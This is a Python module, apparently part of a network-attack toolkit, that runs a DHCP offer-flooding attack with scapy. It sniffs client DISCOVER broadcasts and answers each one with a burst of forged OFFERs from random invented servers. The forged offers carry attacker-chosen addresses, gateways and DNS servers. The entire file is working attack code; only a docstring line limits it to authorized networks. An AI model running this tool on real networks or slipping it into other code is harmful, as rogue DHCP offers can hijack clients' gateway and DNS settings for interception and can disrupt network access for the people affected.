"""DHCP offer flooding: answer each client DISCOVER with many OFFERs from random servers.

A client waits for offers that match its DISCOVER (same transaction ID and client
MAC), then takes one. An attacker that sees the DISCOVER can answer it at once with
many offers, each from a different invented server, with a different address and
gateway. The client receives a burst of offers, and the first one may come from the
attacker. The burst also consumes the client's processing and its choice of server.

The attacker needs the DISCOVER to match the client's transaction ID, so it works on
the segment where the client's broadcasts are visible.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import BOOTP, DHCP, IP, UDP, AsyncSniffer, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.common import BROADCAST_MAC, random_mac, read_interface_mac, run_command, Runner

SERVER_PORT = 67
CLIENT_PORT = 68
MAX_OFFERS = 50


@dataclass(frozen=True)
class OfferFloodConfig:
    iface: str                       # attacker interface, on the segment with the clients
    network: str = "192.168.0.0/24"  # pool the invented servers and addresses are drawn from
    offers_per_discover: int = 10    # OFFERs sent in answer to each DISCOVER
    dry_run: bool = False

    def __post_init__(self) -> None:
        try:
            net = ipaddress.IPv4Network(self.network, strict=False)
        except ValueError as exc:
            raise ValueError("Network must be an IPv4 prefix, for example 192.168.0.0/24.") from exc
        if net.num_addresses < 8:
            raise ValueError("The network needs at least 8 addresses.")
        if not 1 <= self.offers_per_discover <= MAX_OFFERS:
            raise ValueError(f"Offers per DISCOVER must be between 1 and {MAX_OFFERS}.")


@dataclass
class OfferFloodStats:
    discovers: int = 0
    offers: int = 0
    status: str = ""


def _host_addresses(network: str) -> list[str]:
    return [str(host) for host in ipaddress.IPv4Network(network, strict=False).hosts()]


def build_offer(rng: random.Random, network: str, discover: Packet) -> Packet:
    """OFFER from a random invented server, answering `discover` (same xid and client MAC)."""
    hosts = _host_addresses(network)
    server_ip, yiaddr = rng.sample(hosts, 2)
    router = rng.choice(hosts)
    server_mac = random_mac(rng)
    bootp = discover[BOOTP]
    return (
        Ether(src=server_mac, dst=BROADCAST_MAC)
        / IP(src=server_ip, dst="255.255.255.255")
        / UDP(sport=SERVER_PORT, dport=CLIENT_PORT)
        / BOOTP(op=2, xid=bootp.xid, yiaddr=yiaddr, siaddr=server_ip, chaddr=bootp.chaddr, flags=bootp.flags)
        / DHCP(options=[
            ("message-type", "offer"),
            ("server_id", server_ip),
            ("lease_time", 3600),
            ("subnet_mask", "255.255.255.0"),
            ("router", router),
            ("name_server", router),
            "end",
        ])
    )


def is_discover(packet: Packet) -> bool:
    if not (packet.haslayer(DHCP) and packet.haslayer(BOOTP)) or packet[BOOTP].op != 1:
        return False
    for option in packet[DHCP].options:
        if isinstance(option, tuple) and len(option) == 2 and option[0] == "message-type":
            return option[1] in ("discover", 1)
    return False


def run_offer_flooding(
    config: OfferFloodConfig,
    stop_event: threading.Event,
    on_progress: Callable[[OfferFloodStats], None],
    rng: random.Random | None = None,
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
    sniffer_factory: Callable[..., Any] = AsyncSniffer,
) -> OfferFloodStats:
    """Answer every DISCOVER on the interface with a burst of offers until `stop_event` is set."""
    rng = rng or random.Random()
    run = run or run_command
    send = send or sendp

    if config.dry_run:
        stats = OfferFloodStats(
            status=(
                f"Dry run: would answer each DISCOVER with {config.offers_per_discover} offers "
                f"from random servers in {config.network}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    own_mac = read_interface_mac(config.iface, run)
    stats = OfferFloodStats()
    lock = threading.Lock()

    def on_packet(packet: Packet) -> None:
        if not is_discover(packet) or packet.src == own_mac:
            return
        burst = [build_offer(rng, config.network, packet) for _ in range(config.offers_per_discover)]
        with lock:
            stats.discovers += 1
            stats.offers += len(burst)
            snapshot = replace(stats)
        send(burst, iface=config.iface, verbose=False)
        on_progress(snapshot)

    sniffer = sniffer_factory(iface=config.iface, store=False, prn=on_packet)
    sniffer.start()
    try:
        stop_event.wait()
    finally:
        sniffer.stop()
    return stats
